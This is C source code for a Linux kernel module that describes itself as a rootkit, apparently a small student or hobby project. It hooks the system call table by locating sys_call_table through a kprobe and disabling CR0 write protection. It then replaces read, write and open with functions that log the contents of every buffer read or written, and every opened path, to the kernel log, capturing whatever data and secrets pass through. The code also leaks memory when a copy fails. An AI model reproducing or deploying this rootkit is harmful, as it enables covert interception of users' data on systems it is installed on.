#include <linux/fs.h>
#include <linux/ioctl.h>
#include <linux/kprobes.h>
#include <linux/miscdevice.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

#include "rootkit-main.h"
#include "mem-protect.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("[AUTHOR 1], [AUTHOR 2], [AUTHOR 3], [AUTHOR 4]");
MODULE_DESCRIPTION("A Linux kernel rootkit");
MODULE_VERSION("0.1");

static unsigned long orig_cr0;
static kallsyms_t lookup_name;
static uint64_t *syscall_table;
static sysfun_t orig_read;
static sysfun_t orig_write;
static sysfun_t orig_open;

static int __init rootkit_init(void)
{
	int err;

	// Declare what we need to find
	struct kprobe probe = {
		.symbol_name = "kallsyms_lookup_name",
	};

	err = register_kprobe(&probe);
	if (err) {
		pr_err("[ROOTKIT] Failed to get kallsyms_lookup_name() address.");

		return err;
	}

	// Function pointer type of kallsyms_lookup_name()
	lookup_name = (kallsyms_t)(probe.addr);

	// Cleanup kprobe as we don't need it anymore
	unregister_kprobe(&probe);

	// Find syscall table address
	syscall_table = lookup_name("sys_call_table");

	orig_cr0 = unprotect_memory();

	orig_read = (sysfun_t)syscall_table[__NR_read];
	syscall_table[__NR_read] = (uint64_t)new_read;
	orig_write = (sysfun_t)syscall_table[__NR_write];
	syscall_table[__NR_write] = (uint64_t)new_write;
	orig_open = (sysfun_t)syscall_table[__NR_open];
	syscall_table[__NR_open] = (uint64_t)new_open;

	protect_memory(orig_cr0);

	pr_info("[ROOTKIT] Module loaded");
	pr_info("[ROOTKIT] kallsym_lookup_name() address: %p", lookup_name);
	pr_info("[ROOTKIT] Syscall table address: %p", syscall_table);
	return 0;
}

static __exit void rootkit_exit(void)
{
	// Restore original syscall functions
	orig_cr0 = unprotect_memory();

	syscall_table[__NR_read] = (uint64_t)orig_read;
	syscall_table[__NR_write] = (uint64_t)orig_write;
	syscall_table[__NR_open] = (uint64_t)orig_open;

	protect_memory(orig_cr0);

	pr_info("[ROOTKIT] Module unloaded");
	return;
}

long new_read(struct pt_regs *regs)
{
	unsigned int fd = (unsigned int)regs->di; // first parameter
	char __user *buf = (char __user *)regs->si; // second parameter
	size_t count = (size_t)regs->dx; // third parameter

	long ret;
	char *data;

	pr_info("[ROOTKIT] read(%u, %p, %zd)", fd, buf, count);

	ret = orig_read(regs);

	data = (char *)kvmalloc(count + 1, GFP_KERNEL);

	if (copy_from_user(data, buf, count)) {
		pr_err("[ROOTKIT] * Could not copy data from user");
	} else {
		data[count] = '\0';
		pr_info("[ROOTKIT] * Data read: %s", data);
		kvfree(data);
	}

	return ret;
}

long new_write(struct pt_regs *regs)
{
	unsigned int fd = (unsigned int)regs->di;
	const char __user *buf = (const char __user *)regs->si;
	size_t count = (size_t)regs->dx;

	char *data;

	pr_info("[ROOTKIT] write(%u, %p, %zd)", fd, buf, count);

	data = (char *)kvmalloc(count + 1, GFP_KERNEL);

	if (copy_from_user(data, buf, count)) {
		pr_err("[ROOTKIT] * Could not copy data from user");
	} else {
		data[count] = '\0';
		pr_info("[ROOTKIT] * Data to write: %s", data);
		kvfree(data);
	}

	return orig_write(regs);
}

long new_open(struct pt_regs *regs)
{
	const char __user *filename = (const char *)regs->di;
	int flags = (int)regs->si;
	umode_t mode = (umode_t)regs->dx;

	pr_info("[ROOTKIT] open(\"%s\", %#x, 0%ho)", filename, flags, mode);

	return orig_open(regs);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
